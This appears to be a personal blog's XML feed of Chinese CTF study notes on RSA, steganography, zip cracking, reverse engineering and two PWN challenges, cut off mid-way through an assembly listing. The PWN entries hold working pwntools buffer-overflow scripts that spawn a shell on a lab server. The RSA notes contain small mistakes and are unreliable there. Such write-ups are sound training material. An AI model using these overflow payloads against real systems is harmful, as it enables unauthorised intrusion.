      
    </entry>
    
    
    
    <entry>
      <title>原理</title>
      <link href="/2025/06/1020b887dd37.html"/>
      <url>/2025/06/1020b887dd37.html</url>
      
        <content type="html"><![CDATA[<p><strong>密钥计算方法</strong><br>1.选择两个大素数p和q(典型值为1024位)<br>2.计算<code>n=p×q</code>和<code>z=(p-1)×(q-1)</code><br>&#x2F;&#x2F; n表示欧拉函数<br>3.选择一个与z互质的数，令其为d<br>4.找到一个 e 使满足<code>exd= 1 (mod z)</code><br>5.公开密钥为<code>(e，m)</code>，私有密钥为<code>(d，m)</code><br><strong>密钥举例</strong><br>代码如下（示例）：1.假设需要加密的明文信息为m&#x3D;85，选择：e&#x3D;7，p&#x3D;11，q&#x3D;13，说明使用RSA算法的加密和解密(计算密文并还原)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n=p*q=11*13=143</span><br><span class="line">z=（p-1）*（q-1）=10*12=120</span><br><span class="line"></span><br><span class="line">e*d=1(mod z)  </span><br><span class="line">7 * d( mod 120)=1  -------d=103</span><br></pre></td></tr></table></figure><p>1️⃣加密运算<br>公钥:(e,n)&#x3D;(7,143)<br>密文c&#x3D;p^e (mod n)&#x3D;123<br>2️⃣加密运算<br>密钥:(d,n)&#x3D;(103,143)<br>明文：P&#x3D;c^d (mod n)&#x3D;85</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>感觉身上重重的</title>
      <link href="/2025/06/098257f0671a.html"/>
      <url>/2025/06/098257f0671a.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/out.jpg"><br><img src="/images/Pastedimage20250604103412.png"><br>TZCFlag{copy_is_useful}<br>&#x3D;&#x3D;图片下面有字隐藏其实，用stegsolve&#x3D;&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 图片 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>伪加密</title>
      <link href="/2025/06/3411655f66f0.html"/>
      <url>/2025/06/3411655f66f0.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/354DEABD-F725-4BE5-8E53-3E409F7E10FC.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>掩码</title>
      <link href="/2025/06/bb2621d41570.html"/>
      <url>/2025/06/bb2621d41570.html</url>
      
        <content type="html"><![CDATA[<p>小强找到自己的压箱底学习资料，但是发现有密码，他隐约记得密码是长 <code>AQ***g0**0</code>，中间 <code>*</code> 号只记得是小写字母和数字，你能帮他找回密码吗<br><img src="/images/Pastedimage20250604130116.png"><br><img src="/images/Pastedimage20250604130408.png">TZCFlag{th3_password_1s_s0_so_weak}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>暴力</title>
      <link href="/2025/06/bf9cbf41e4a4.html"/>
      <url>/2025/06/bf9cbf41e4a4.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250604125245.png"><br>TZCFlag{the_passw0rd_is_sooo_weak}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>明文</title>
      <link href="/2025/06/8a95981b2a01.html"/>
      <url>/2025/06/8a95981b2a01.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/57FCDD10-AE2B-4DBF-8DE9-1B19984A5445.png"><br>把pdf改成压缩包</p><p><img src="/images/Pastedimage20250604130730.png"><br><img src="/images/9FF4A261-2915-4D42-B8F4-FFA1CA8AB5E5.png"><br>有问题</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>伪加密</title>
      <link href="/2025/06/4b2a6ff1da24.html"/>
      <url>/2025/06/4b2a6ff1da24.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>steghide</title>
      <link href="/2025/06/c540cc75b717.html"/>
      <url>/2025/06/c540cc75b717.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250604133850.png"><br>错的</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 综合 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Banmabanma</title>
      <link href="/2025/06/4c2e0afe7e89.html"/>
      <url>/2025/06/4c2e0afe7e89.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 码类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hear with you eyes</title>
      <link href="/2025/06/f342c5c4709f.html"/>
      <url>/2025/06/f342c5c4709f.html</url>
      
        <content type="html"><![CDATA[<p>打开频谱图<br><img src="/images/2D31FA56-C817-4AC6-A587-C9008BA90B74.png"></p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 音频 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>steghide</title>
      <link href="/2025/06/fdd3a6b2e8b3.html"/>
      <url>/2025/06/fdd3a6b2e8b3.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf your_file.wav #从 WAV 文件中提取隐藏数据</span><br></pre></td></tr></table></figure><p><img src="/images/BEE0A87B-FE33-46DE-B36F-EB728163008C.png"><br>&#x3D;&#x3D;<strong>要转换的文件放在它的文件夹下</strong>&#x3D;&#x3D;<br><img src="/images/11E69F33-84F4-4962-A257-E294ED63D946.png"><br>TZCFlag{steghide_is_so_interesting}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 音频 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>很普通的Disco</title>
      <link href="/2025/06/ff1c1e43f89c.html"/>
      <url>/2025/06/ff1c1e43f89c.html</url>
      
        <content type="html"><![CDATA[<p>放大<img src="/images/051C5CE7-A087-4021-8A67-CA44B66376DE.png"><br>110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101<br>&#x3D;&#x3D;<strong>ASCII是7位</strong>&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">string = &#x27;110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101&#x27;</span><br><span class="line"> </span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(0, len(string), 7):</span><br><span class="line">    bin_str = string[i: i + 7]</span><br><span class="line">    flag += chr(int(bin_str, 2))</span><br><span class="line"> </span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>flag{W0W*funny}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 音频 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>32位</title>
      <link href="/2025/06/4857d55b1f10.html"/>
      <url>/2025/06/4857d55b1f10.html</url>
      
        <content type="html"><![CDATA[<p><img src="/../../../images/0E02FF5F-B470-4DFF-ACBA-4AB58A61BF8E.png"><br><img src="/../../../images/2574EBBA-F48A-4D4A-82BA-B370AF737470.png"><br><img src="/../../../images/Pastedimage20250605202610.png"><br><img src="/../../../images/Pastedimage20250605203003.png"><br><img src="/../../../images/Pastedimage20250605205511.png"><br>这里 system 函数的地址：0x80483A0</p><p>这里将系统函数与参数分开了，我们需要手动构造，这是ROP？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*(0x12+4) + p32(system) + p32(0) + p32(bin_sh)</span><br><span class="line">b&#x27;a&#x27; * (0x12 + 4)：这部分是填充，填充的目的是使得输入的长度超过了原本的缓冲区大小，触发缓冲区溢出。</span><br><span class="line">p32(system)：这部分是 system 函数的地址，在利用缓冲区溢出漏洞时，重要的一步是覆盖返回地址，使得程序返回时跳转到 system 函数。</span><br><span class="line">p32(0)：这部分是 system 函数的第二个参数，在大多数情况下，system 函数的第二个参数应该是一个指向空值的指针，表示没有额外的参数，这里使用了0，表示一个空指针。</span><br><span class="line">p32(bin_sh)：这部分是 /bin/sh 字符串的地址，作为 system 函数的第一个参数，/bin/sh 是一个用于启动 shell 的路径，在利用缓冲区溢出漏洞时，我们可以使用这个参数来告诉 system 函数要执行的命令。</span><br></pre></td></tr></table></figure><p>首先在溢出后填入 system 函数的地址，这个地址将覆盖程序返回地址，以便控制程序流程。<br>此外我们需要考虑函数调用栈的结构：system函数的第一个参数通常是一个指向要执行的命令的字符串，如 &#x2F;bin&#x2F;sh，需要将这个字符串的地址作为参数传递给 system 函数，system 函数的第二个参数通常是一个指向空值的指针，表示没有额外的参数。在 payload 中，可以使用任意值，比如  0 ，使用 p32() 函数将地址转换为4字节的字符串，也可以用其他任意 4 字节字符，如 ‘aaaa’，最后再加上 bin&#x2F;sh 的地址，我们就能够利用缓冲区溢出漏洞成功调用 system(“&#x2F;bin&#x2F;sh”)，从而获取到所需的 shell。<br><img src="/../../../images/24A745DD-622B-4D5D-89E0-A74989D98664.png"><br>&#x2F;bin&#x2F;sh 字符串的地址： 0x8048750</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;10.190.131.17&#x27;</span>, <span class="number">28118</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>) + p32(<span class="number">0x80483A0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x8048750</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../../../images/E620E748-CEBD-4166-BD5C-889B55FC7B0C.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> ret2text 栈溢出 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>64位</title>
      <link href="/2025/06/8764702209e4.html"/>
      <url>/2025/06/8764702209e4.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/EDC60431-C7F0-4706-B7EE-C0C20022E216.png"><br><img src="/images/89BB9CEE-D6C5-4168-8559-A837556C9144.png"><br><img src="/images/Pastedimage20250605190959.png"><br>buf 到栈底（ebp）的距离是：0xA，64 位程序加上 8 字节的栈底（rbp）<br><img src="/images/Pastedimage20250605191047.png"><br>backdoor函数地址：0x400657<br>对于 32 位程序来说，现在就能打通了<br>但是这里是 64 位程序，需要处理堆栈平衡<br>#堆栈平衡：当我们在堆栈中进行堆栈的操作的时候，一定要保证在ret这条指令之前，esp指向的是我们压入栈中的地址，函数执行到ret执行之前，堆栈栈顶的地址一定要是call指令的下一个地址。<br>因此我们还需要找一个地址： lev 的地址或者该函数结束的地址（即 retn 的地址）<br>直接看 backdoor 函数的汇编代码：<br><img src="/images/Pastedimage20250605192121.png"><br>lev 的地址：0x40065B<br>retn 的地址：0x40066D<br><strong>特别注意：构造 payload 时将该地址放在该函数开始地址之前</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;10.190.131.17&#x27;</span>, <span class="number">55024</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + p64(<span class="number">0x40065B</span>) + p64(<span class="number">0x400657</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;*(0xA+8) + p64(0x40066D) + p64(0x400657) 可</span></span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;*(0xA+8) + p64(0x40065B) 也可以啊不是很懂</span></span><br></pre></td></tr></table></figure><p><img src="/images/BDC96406-6B8C-4852-90CC-38D5162440C3.png"></p><ol><li><code>p64(0x40065B)</code> → 覆盖返回地址为<code>0x40065B</code></li><li><code>p64(0x400657)</code> → 在栈上放置后门函数地址</li></ol><h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><p>当函数返回时：</p><ol><li>跳转到<code>0x40065B</code>（跳过函数开头的<code>push rbp; mov rbp, rsp</code>）</li><li>执行<code>lea rdi, command</code> → 设置好<code>system</code>的参数</li><li>执行<code>call _system</code> → 调用<code>system(&quot;/bin/sh&quot;)</code></li><li>执行<code>pop rbp</code> → 弹出栈顶值到RBP（此时栈顶是<code>0x400657</code>）</li><li>执行<code>retn</code> → 弹出栈顶值<code>0x400657</code>到RIP，跳转到后门函数开头</li></ol><h3 id="为什么要这样跳转两次？"><a href="#为什么要这样跳转两次？" class="headerlink" title="为什么要这样跳转两次？"></a>为什么要这样跳转两次？</h3><ol><li><strong>避免栈对齐问题</strong>：64位系统要求调用函数时栈指针16字节对齐<ul><li>直接跳转到<code>0x40065B</code>时，栈指针可能未对齐</li><li>第二次跳转到函数开头（<code>0x400657</code>）会执行<code>push rbp</code>，使栈对齐</li></ul></li><li><strong>确保参数正确设置</strong>：<ul><li>第一次跳转确保<code>rdi</code>正确设置为<code>&quot;/bin/sh&quot;</code></li><li>第二次跳转执行完整的<code>system</code>调用</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> ret2text 栈溢出 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>我的眼睛能看到比较低的东西</title>
      <link href="/2025/06/b7489399e5c7.html"/>
      <url>/2025/06/b7489399e5c7.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/flag11.png"><br><img src="/images/B7FFEEE2-E071-41DC-A3E3-4BDA0719A462.png"><br><img src="/images/Pastedimage20250604104025.png"><br><img src="/images/Pastedimage20250604104046.png"><br><img src="/images/Pastedimage20250604105300.png"><br><img src="/images/3E1FFA08-BA9D-4AA5-8A9A-6D469456C255%7D.png"><br><img src="/images/CE52806F-ECC7-47DF-8A20-7224D63472F8.png"><br>cumtctf{1sb_i4_s0_Ea4y}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 图片 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快捷键</title>
      <link href="/2025/06/7041daea1662.html"/>
      <url>/2025/06/7041daea1662.html</url>
      
        <content type="html"><![CDATA[<p>空格键：反汇编窗口切换文本跟图形</p><p>Esc：在反汇编窗口中使用为后退到上个操作的地址处</p><p>Shift +F5：打开签名窗口</p><p>shift+F12：自动分析出参考字符串</p><p>ALT+T：搜索字符串(文本搜索)</p><p>ALT+L：标记(Lable)</p><p>ALT+M：设置标签(mark)</p><p>ALT+G：转换局部变量为结构体</p><p>ALT+Enter：跳转到新的窗口</p><p>Alt+B：快捷键用于搜索十六进制字节序列，通常在分析过程中可以用来搜索opcode</p><p>CTRL+M：列举出当前已经添加的标签</p><p>CTRL+S列举出二进制程序的段的开始地址、结束地址、权限等信息</p><p>F9：动态调试程序(其实IDA主要用作静态分析用的)</p><p>F5：将一个函数逆向出来(生成c伪代码)</p><p>G：跳转到指定地址</p><p>A：将选择的信息转换成ASCII(转换成可读性跟强的字符串)</p><p>X(ctrl+X)：交叉引用,类似于OD中的栈回溯操作</p><p>N：对符号重命名</p><p>：&amp;；(冒号&amp;分号)：光标所在位置添加常规注释和可重复注释</p><p>P：创建函数</p><p>T：解析结构体偏移</p><p>M：转换为枚举类型常量</p><p>Y：设置变量类型</p><p>H：转换16进制</p><p>C：光标所在地址处的内容解析成代码</p><p>D：光标所在地址处的内容解析成数据</p><p>A：光标所在地址处的内容解析成ascll码字符串</p><p>U：光标所在地址处的内容解析成未定义内容。</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> IDA Pro使用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快捷键</title>
      <link href="/2025/06/1d6a1034947c.html"/>
      <url>/2025/06/1d6a1034947c.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> IDA Pro使用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快捷键</title>
      <link href="/2025/06/0b9e8826945d.html"/>
      <url>/2025/06/0b9e8826945d.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250605084443.png"><br>从 <code>Exeinfo PE</code> 的识别结果来看，文件 <code>re4</code> 是 <strong>PYO 格式</strong>（Python 优化编译后的字节码文件 ），不是常规的 PE 可执行程序（Windows EXE ）。由 Python 脚本编译生成（<code>python -O script.py</code> 命令会生成 <code>.pyo</code> ），比 <code>.pyc</code> 更小、加载更快，但可读性低。<br><img src="/images/Pastedimage20250605085914.png"><br><img src="/images/Pastedimage20250605085556.png"><br>这样提示文件打开是空白的<br><img src="/images/61B19F00-C9FE-410A-B85C-857D129B8E68.png"><br>这是正确的<br><img src="/images/Pastedimage20250605085613.png"><img src="/images/C6F9A70A-E2ED-427B-9929-BFAE4BBEE979.png"><br>&#x3D;&#x3D;<strong>要把文件后缀改成pyc</strong>&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">message</span>):</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = <span class="built_in">ord</span>(i) ^ <span class="number">32</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">correct = <span class="string">&#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Input flag:&#x27;</span></span><br><span class="line">flag = raw_input()</span><br><span class="line"><span class="keyword">if</span> encode(flag) == correct:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;correct&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;wrong&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>这个程序定义了一个<code>encode</code>函数，对输入字符串进行处理：</p><ol><li>每个字符的 ASCII 值与 32 进行异或操作</li><li>结果加 16</li><li>将处理后的字符组合成新字符串</li><li>对新字符串进行 Base64 编码<br>最后将编码结果与预定义的<code>correct</code>值进行比较。我们需要逆向这个过程来找到原始的 flag。</li></ol><h3 id="逆向过程"><a href="#逆向过程" class="headerlink" title="逆向过程"></a>逆向过程</h3><p>要还原 flag，我们需要反向执行上述步骤：</p><ol><li>对 Base64 编码进行解码</li><li>每个字符减 16</li><li>与 32 进行异或操作<br>下面是逆向的 Python 代码：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import base64 </span><br><span class="line">correct = &#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27; </span><br><span class="line"># 第一步：Base64解码 </span><br><span class="line">decoded = base64.b64decode(correct) </span><br><span class="line"># 第二步：逆向处理每个字符 </span><br><span class="line">flag = &#x27;&#x27; </span><br><span class="line">for c in decoded: </span><br><span class="line"># Python3中需要处理字节对象 </span><br><span class="line">if isinstance(c, int): </span><br><span class="line">x = c </span><br><span class="line"># Python2中需要处理字节对象 </span><br><span class="line">else: </span><br><span class="line">x = ord(c) </span><br><span class="line">x = x - 16 </span><br><span class="line">x = x ^ 32 </span><br><span class="line">flag += chr(x) </span><br><span class="line">print(&quot;Flag:&quot;, flag)</span><br></pre></td></tr></table></figure><p>nctf{d3c0mpil1n9_PyC}</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> PYC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快捷键</title>
      <link href="/2025/06/09ee5b3fb6a2.html"/>
      <url>/2025/06/09ee5b3fb6a2.html</url>
      
        <content type="html"><![CDATA[<p>好像加了什么东西？<br><img src="/images/95B1D75F-151D-4911-9152-2AAB97FC95D9.png"><br>从 <code>Exeinfo PE</code> 识别结果看，目标文件是 <strong>64 位 ELF 格式</strong>（非 Windows 可执行程序），且加了 <code>UPX</code> 壳 。</p><p>将脱壳的程序叫 re3和 upx.exe 放在同一目录：</p><ol><li><strong>查看壳信息</strong>（确认是 UPX 壳）： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx.exe -l re3</span><br></pre></td></tr></table></figure>输出会显示 <code>UPX</code> 版本、压缩率等，确认是 UPX 壳再继续。</li><li><strong>执行脱壳</strong>：</li></ol><pre><code>  upx.exe -d re3.exe  ```    - 成功提示：`Unpacked 1 file...`  - 失败提示：`Not packed by UPX`（说明不是 UPX 壳，换其他工具 ）![](images//assets/images/&#123;2641DC93-B260-4C2C-95F1-CFB5B93000BD&#125;.png)![](images//assets/images/Pasted image 20250604161619.png)![](images//assets/images/Pasted image 20250604161706.png)</code></pre>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> UPX </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>你会编汇编吗</title>
      <link href="/2025/06/fbf65d286087.html"/>
      <url>/2025/06/fbf65d286087.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> 未命名 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>你会编汇编吗</title>
      <link href="/2025/06/d15a555fb50a.html"/>
      <url>/2025/06/d15a555fb50a.html</url>
      
        <content type="html"><![CDATA[<p>shift+F12+Fn搜索flag<br><img src="/images/Pastedimage20250604153708.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> 未命名 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>source</title>
      <link href="/2025/06/5e1bd234a6b7.html"/>
      <url>/2025/06/5e1bd234a6b7.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt; </span><br><span class="line">int main(int argc, char *argv[]) &#123; </span><br><span class="line">if (argc != 4) &#123; </span><br><span class="line">printf(&quot;what?\n&quot;); </span><br><span class="line">exit(1); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">unsigned int first = atoi(argv[1]);</span><br><span class="line">if (first != 0xcafe) &#123; </span><br><span class="line">printf(&quot;you are wrong, sorry.\n&quot;); </span><br><span class="line">exit(2);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">unsigned int second = atoi(argv[2]); </span><br><span class="line">if (second % 5 == 3 || second % 17 != 8) &#123; </span><br><span class="line">printf(&quot;ha, you won&#x27;t get it!\n&quot;); </span><br><span class="line">exit(3); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (strcmp(&quot;h4cky0u&quot;, argv[3])) &#123; </span><br><span class="line">printf(&quot;so close, dude!\n&quot;); </span><br><span class="line">exit(4); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">printf(&quot;Brr wrrr grr\n&quot;); </span><br><span class="line"></span><br><span class="line">unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207; </span><br><span class="line">printf(&quot;Get your key: &quot;); </span><br><span class="line">printf(&quot;%x\n&quot;, hash); </span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>这个程序需要三个命令行参数才能正常运行：</p><ol><li>第一个参数必须是整数<code>0xcafe</code>（即十进制的 51966）</li><li>第二个参数必须满足两个条件：<ul><li>模 5 不等于 3</li><li>模 17 等于 8</li></ul></li><li>第三个参数必须是字符串&#96;h4cky0</li></ol><p><strong>正确运行方法：</strong><br>.&#x2F;程序名 51966 25 h4cky0u</p><p>Brr wrrr grr<br>Get your key: c0ffee</p><p>OR<br><strong>直接算</strong><br>hash &#x3D; 51966 * 31337 + 8 * 11 + 8 - 1615810207 &#x3D; 1628468542 + 88 + 8 - 1615810207 &#x3D; 1628468638 - 1615810207 &#x3D; 12658431<br>转换为十六进制：<code>0xc0ffee</code></p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> 直接给程序 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>你会编汇编吗</title>
      <link href="/2025/06/db3be185141e.html"/>
      <url>/2025/06/db3be185141e.html</url>
      
        <content type="html"><![CDATA[<p>点开这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401550                 push    rbp</span><br><span class="line">.text:0000000000401551                 mov     rbp, rsp</span><br><span class="line">.text:0000000000401554                 sub     rsp, 90h</span><br><span class="line">.text:000000000040155B                 call    __main</span><br><span class="line">.text:0000000000401560                 lea     rcx, Buffer     ; &quot;input your flag:&quot;</span><br><span class="line">.text:0000000000401567                 call    puts</span><br><span class="line">.text:000000000040156C                 lea     rax, [rbp+Str]</span><br><span class="line">.text:0000000000401570                 mov     rdx, rax</span><br><span class="line">.text:0000000000401573                 lea     rcx, Format     ; &quot;%s&quot;</span><br><span 